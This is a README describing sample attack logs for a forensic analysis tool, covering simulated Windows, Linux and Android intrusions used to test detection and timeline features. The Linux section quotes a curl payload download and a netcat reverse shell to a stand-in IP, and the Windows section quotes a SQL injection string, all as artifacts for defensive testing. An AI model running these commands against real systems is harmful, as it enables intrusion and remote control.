# 📁 ForensicLens Sample Datasets

ForensicLens includes realistic, multi-stage sample log files representing major platforms: **Windows**, **Linux**, and **Android**. These logs are formatted specifically to exercise the automated detection engines, timeline reconstruction, MITRE ATT&CK mapper, and AI incident storyline generation.

---

## 📋 Available Sample Logs

| File | Platform | Primary Log Type | Scenario Description |
| :--- | :--- | :--- | :--- |
| [`windows_attack.log`](./windows_attack.log) | **Windows** | Sysmon & Security Events | Enterprise APT intrusion: Brute force, Privilege Escalation, PowerShell dropper, C2 beacon, Mimikatz, USB exfiltration, Ransomware indicators |
| [`linux_system.log`](./linux_system.log) | **Linux** | Syslog, Auth, & Auditd | Server intrusion: SSH Brute Force, Credential Compromise, Sudo abuse, Curl payload download, Cron persistence, iptables drop |
| [`android_logcat.log`](./android_logcat.log) | **Android** | Android Logcat | Mobile banking spyware: Sideloaded APK installation, Trojan service launch, SELinux policy denials, Security app removal, Runtime crash |
| [`enterprise_attack.log`](./enterprise_attack.log) | **Windows** | Enterprise Unified | Multi-stage lateral movement and credential harvesting scenario |
| [`attack_scenario.log`](./attack_scenario.log) | **Windows / Multi** | Mixed Forensic Evidence | End-to-end cyber incident with USB data theft, C2, and cloud API access |

---

## 🔍 Detailed Scenario Breakdown

### 1. 🪟 Windows Attack Log (`windows_attack.log`)
- **Host**: `WORKSTATION-01`
- **Attacker IP**: `192.168.1.105`
- **Key Forensic Artifacts**:
  - **Initial Access**: SQL Injection attempt against IIS web server (`GET /api/v1/login?user=admin' OR 1=1--`).
  - **Credential Access**: RDP/SMB Brute force attack with repeated Event ID 4625 logon failures followed by Event ID 4624 logon success.
  - **Privilege Escalation**: Event ID 4672 special privileges assigned (`runas=SYSTEM`).
  - **Execution & Ingress**: Sysmon Event ID 1 executing Base64-encoded PowerShell script, followed by `certutil.exe -urlcache` pulling remote payload `C:\temp\payload.exe`.
  - **Defense Evasion**: Sysmon Event ID 1 execution via `rundll32.exe`.
  - **Command & Control (C2)**: Sysmon Event ID 3 outbound connection to `198.51.100.50:443` and Event ID 22 DNS query for `c2-beacon.darknet-relay.org`.
  - **Persistence**: Sysmon Event ID 13 Registry Run key modification (`HKLM\SOFTWARE\...\Run\SecurityUpdate`).
  - **Credential Dumping**: Sysmon Event ID 10 process access to `lsass.exe` by `mimikatz.exe`.
  - **Lateral Movement**: SMB connection to Domain Controller `192.168.1.200:445` using service account `svc_backup`.
  - **Data Theft / Exfiltration**: USB mass storage insertion (`Kingston DataTraveler`), document copies (`financial_q4.xlsx`, `customer_db.sql`), and 8443 exfiltration.
  - **Impact & Anti-Forensics**: File deletion (`event_id=23`), Security Log cleared (`event_id=1102`), encrypted file extension, and ransom note creation (`README_RECOVER.txt`).

---

### 2. 🐧 Linux System Log (`linux_system.log`)
- **Host**: `prod-srv-01`
- **Attacker IP**: `198.51.100.12`
- **Key Forensic Artifacts**:
  - **SSH Brute Force**: Repeated `sshd` authentication failures for invalid accounts (`admin`, `test`, `guest`, `support`) and `root`.
  - **Account Compromise**: `sshd` accepted password for `deployer` and PAM session opened (`pam_unix(sshd:session): session opened`).
  - **Linux Audit Logs**: Audit subsystem event `type=USER_LOGIN res=success` capturing PID and UID.
  - **Privilege Escalation**: `sudo` execution by `deployer` running `/bin/bash` as root.
  - **Auditd Process Tracking**: `type=EXECVE` audit events tracing `/bin/bash` and `/usr/bin/curl`.
  - **Malicious Payload Ingress**: Root running `curl -fsSL http://198.51.100.77/dropper.sh -o /tmp/dropper.sh` and `chmod +x`.
  - **Persistence**: Linux `CRON` executing `/tmp/dropper.sh` every scheduled interval.
  - **Reverse Shell**: Netcat execution `/bin/nc -e /bin/bash 198.51.100.77 4444`.
  - **Network / Firewall**: Linux `kernel` iptables dropping connection attempt on port 4444.
  - **Anti-Forensics & Logoff**: Sudo `rm -f /tmp/dropper.sh`, PAM session closed, and SSH connection terminated.

---

### 3. 🤖 Android Logcat (`android_logcat.log`)
- **Device / OS**: Android 14 (`system_server`, `vold`, `installd`)
- **Malicious Package**: `com.secure.bank.authenticator` (Fake Banking Authenticator / Spyware)
- **Key Forensic Artifacts**:
  - **System Initialization**: Core Android framework startup logs (`system_server`, `vold`, `installd`).
  - **Sideloading Attack**: Android `PackageManager` installing untrusted APK from `/data/local/tmp/fake_update.apk`.
  - **Application & Service Launch**: `ActivityManager` launching `com.secure.bank.authenticator/.MainActivity` and background service `.SpyService`.
  - **SELinux Mandatory Access Control Violations**:
    - SELinux denial `avc: denied { read write }` for accessing sensitive system data files (`tcontext=u:r:system_data_file:s0`).
    - SELinux denial `avc: denied { ptrace }` targeting `system_server` (Privilege Escalation / Process Injection attempt).
    - SELinux denial `avc: denied { ioctl }` on `/dev/binder`.
  - **Defense Evasion / Tampering**: `PackageManager` uninstalling mobile endpoint protection (`com.antivirus.mobilesecurity`, `com.lookout.security`).
  - **Runtime Failure & Crash**: `AndroidRuntime` fatal `SecurityException` due to unauthorized access attempt and `ActivityManager` force-killing the process.

---

## 🚀 How to Use

### Via Web Interface
1. Launch the ForensicLens web application:
   ```bash
   python app.py
   ```
2. Navigate to `http://127.0.0.1:5000`.
3. In the upload area, drag & drop any of the files in `sample_logs/` (or click on the sample quick-links on the home page).
4. Select **Auto Detect** or choose the matching platform override, then click **Analyze Evidence**.
5. Explore the reconstructed timeline, MITRE ATT&CK matrix, entity correlation graphs, and AI investigation summary.

### Automated Testing
To verify detection and parsing across all sample logs, run:
```bash
python -m unittest discover tests
```
